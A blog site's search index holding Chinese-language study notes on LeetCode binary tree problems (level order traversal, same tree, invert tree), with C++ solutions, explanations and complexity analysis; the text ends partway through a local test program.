<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>二元樹 Level Order Traversal | Medium | LeetCode#102. Binary Tree Level Order Traversal</title>
      <link href="/posts/db053989.html"/>
      <url>/posts/db053989.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/102/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 Binary Tree 的 <code>root</code>，求 Level Order Traversal 的結果 (須將節點值存在一個二維list中)</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>就是先實踐經典的 Level Order Traversal，然後再嘗試存進 <code>vector&lt;vector&lt;int&gt;&gt; result</code> 返回。但我的想法在我剛實現完標準的 level_order_traversal 後就卡住了，由於我是用 queue 來去做實現，而每一次 push 進 queue後的節點會為同一層 (因為上一層已經被pop出來了) ，因此就可以處理在每一層的時候將節點值添加進 <code>result</code> 中，但我高估了我對 <code>vector</code> 的熟悉程度…</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result=&#123;&#125;;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        queue&lt;TreeNode*&gt;q;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            ++count;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; currentLevel;  </span><br><span class="line"></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Level &quot; &lt;&lt; ++count &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; ++i)&#123;</span><br><span class="line">                TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                currentLevel.<span class="built_in">push_back</span>(current-&gt;val); </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left!=<span class="literal">NULL</span>)&#123; </span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(currentLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先，宣告一個 <code>vector&lt;vector&lt;int&gt;&gt; result</code> 來儲存lever order後的結果</li><li>使用一個 <code>while</code> loop，當queue不為空時，執行以下步驟：<ul><li>獲取當前層的節點數  <code>levelSize</code>，跟剛剛一樣，queue中尚未pop出來的元素會是相同level的節點</li><li>創建一個  <code>vector&lt;int&gt; currentLevel</code>     用於存放當前層的節點值，這也會是二維vector操作的標準做法之一能說這塊第一次練習到</li><li>使用一個 <code>for</code> loop，對當前層的每個節點進行如下操作：<ul><li>取出 front node，將其值加入 <code>currentLevel</code></li><li>若該節點的left child不為空，將它push 進入queue</li><li>若該節點的right child不為空，將它push 進入queue</li></ul></li><li>將 <code>currentLevel</code> 加入 result 中。</li></ul></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/102/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>整個樹的所有節點都會被訪問一次，時間複雜度是 $O(N)$，N 是二元樹中節點的總數</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度主要受結果vector <code>result</code> 影響，<code>result</code> 的大小取決於二元樹的節點數，因此其空間需求為 $O(N)$，另外有使用到 queue，最壞狀況下可能會儲存整棵樹倒queue中，因此空間複雜度會是  $O(N)$</p><p>整體而言的空間複雜度會是 $O(N)$ + $O(N)$ &#x3D; $O(N)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這題直接讓我了解自己對於 <code>vector</code> 的使用不太熟悉，另外在判斷層的時候也時常想錯，尚有很大的進步空間。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相同的二元樹 | Easy | LeetCode#100. Same Tree</title>
      <link href="/posts/3dab679e.html"/>
      <url>/posts/3dab679e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/100/question.jpeg"></p><p><img src="/img/LeetCode/100/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定兩個 Binary Tree 的 root，分別是 <code>p</code> 與 <code>q</code>，請寫一個函式檢查他們是否相同</li></ul><blockquote><p>相同的定義: 結構一樣，並且節點值一樣</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法一樣是遞迴，首先Traverse 到 Leaf，之後檢查節點值，如果不一樣就直接回傳 <code>false</code>，我們可以用一個變數值，將遞迴回傳的結果保存起來，再做為函式的返回值</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> result =<span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;P:&quot;</span> &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot;q:&quot;</span> &lt;&lt; q-&gt;val &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;val != q-&gt;val ) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;left != <span class="literal">NULL</span> || q-&gt;left != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;right != <span class="literal">NULL</span> || q-&gt;right != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p == <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>表示已經遍歷到兩棵樹的末端，並且到目前為止兩棵樹是相同的，所以返回 <code>true</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果其中一個節點是 NULL 而另一個不是，這表示兩棵樹在這個位置上結構不同，因此返回 <code>false</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;val != q-&gt;val ) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>p</code> 和 <code>q</code> 的值不同，返回 false</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;left != <span class="literal">NULL</span> || q-&gt;left != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left);</span><br><span class="line"><span class="keyword">if</span>(p-&gt;right != <span class="literal">NULL</span> || q-&gt;right != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br></pre></td></tr></table></figure><p>檢查左子樹：如果 p 或 q 的左子樹不為 NULL，遞迴檢查左子樹是否相同<br>檢查右子樹：如果 p 或 q 的右子樹不為 NULL，遞迴檢查右子樹是否相同</p><blockquote><p>但其實這裡會有問題，因為如果左子樹返回 false，而右子樹返回 true，它仍會返回最後一次賦值的結果。應該需要加個判斷式來判斷是否出現false result</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/100/result.jpeg"></p><h2 id="更好的寫法"><a href="#更好的寫法" class="headerlink" title="更好的寫法"></a>更好的寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span> || q == <span class="literal">NULL</span>) <span class="keyword">return</span> p == q;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;P:&quot;</span> &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot; q:&quot;</span> &lt;&lt; q-&gt;val &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;val != q-&gt;val) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left) &amp;&amp; <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info flat"><p>這裡合併了上面很冗的判斷式，將 <code>p</code> 和 <code>q</code> 同時為 NULL 或其中之一為 NULL 的情況合併成一個條件。並且移掉了冗餘檢查：在呼叫 isSameTree 前，檢查子樹是否為 NULL 是多餘的，因為遞迴呼叫中已經處理了這種情況，使用遞迴直接返回，利用邏輯運算 <code>&amp;&amp;</code> 直接返回子樹比較結果，減少不必要的變數。</p></div><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$, N 為節點個數，每個節點在遞迴中被訪問一次，進行比較操作，因此時間複雜度是線性的。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(H)$, H　為樹的高度，最壞情況下樹高會等於節點數量 N，而如果式平衡二元樹，則會是 $O(LogN)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反轉二元樹 | Easy | LeetCode#226. Invert Binary Tree</title>
      <link href="/posts/5371066e.html"/>
      <url>/posts/5371066e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/226/question1.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個 Binary Tree 的<code>root</code>，反轉他以後，回傳它的 <code>root</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>題目敘述很簡短，但基本上就是除了root以外，左葉子樹的成員都對調</p></blockquote><blockquote><p>但學會了<a href="https://leozzmc.github.io/posts/4cd60718.html">上一題</a>遞迴的概念後，這題幾乎是秒解，但還是有考慮不周到的地方</p></blockquote><p>我一開始的想法，就是一樣透過遞迴的方式，一開始就 traverse 到樹葉，碰到樹葉後，再將他們的左右child進行對調，之後一路fuction return 回去，然後回傳一開始原先的root即可</p><p>我一開始的思路會是下面這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BT::invertTree</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span> &amp;&amp; current-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    tmp = current-&gt;left;</span><br><span class="line">    current-&gt;left = current-&gt;right;</span><br><span class="line">    current-&gt;right = tmp;</span><br><span class="line">    tmp =<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但上面的 <code>if(current-&gt;left != NULL &amp;&amp; current-&gt;right != NULL)&#123;&#125;</code> 會在 skewd tree 的時候出問題:</p><p>原本給的 tree會是 <code>[2,3,null,1]</code>，如果按照這樣跑出來會是 <code>[2,null,3,1]</code></p><p>題目原先的樹會長這樣:</p><p><img src="/img/LeetCode/226/edge.jpeg"></p><p>預期輸出:  <code>[2,null,3,null,1]</code></p><p><img src="/img/LeetCode/226/edge2.jpeg"></p><p>但我上面的作法會變成:  <code>[2,null,3,1]</code>，這是因為條件判斷 <code>if(current-&gt;left != NULL &amp;&amp; current-&gt;right != NULL)</code> 只在當前節點的左右子節點都不為 NULL 的情況下進行遞迴調用和交換。因此，它無法處理只有一個子節點的情況，從而導致錯誤的樹結構</p><p><img src="/img/LeetCode/226/edge3.jpeg"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">        TreeNode *current = root;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        tmp = current-&gt;left;</span><br><span class="line">        current-&gt;left = current-&gt;right;</span><br><span class="line">        current-&gt;right = tmp;</span><br><span class="line">        tmp =<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>上面使用深度優先搜索（DFS）的遞迴方法遍歷整棵樹。在遞迴過程中，首先翻轉每個節點的左右子樹，然後進行交換操作。這樣，每次遞迴完成後，當前節點的子樹就被翻轉了。最終，整棵樹的所有節點都被翻轉。</p><p>翻轉後，樹中每個節點的左子節點和右子節點都被交換，形成了整棵樹的鏡像。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/226/result.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *left, *right;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">left</span>(<span class="number">0</span>),<span class="built_in">right</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">left</span>(<span class="number">0</span>),<span class="built_in">right</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode* leftnode, TreeNode* rightnode):<span class="built_in">val</span>(x),<span class="built_in">left</span>(leftnode),<span class="built_in">right</span>(rightnode)&#123;&#125;;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> TreeNode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">BT</span>(): <span class="built_in">root</span>(<span class="number">0</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">BT</span>(TreeNode* node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//member function</span></span><br><span class="line">        <span class="function">TreeNode * <span class="title">invertTree</span><span class="params">(TreeNode* root)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">levelOrder</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BT::levelOrder</span><span class="params">()</span></span>&#123; </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="keyword">this</span>-&gt;root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; current-&gt;val 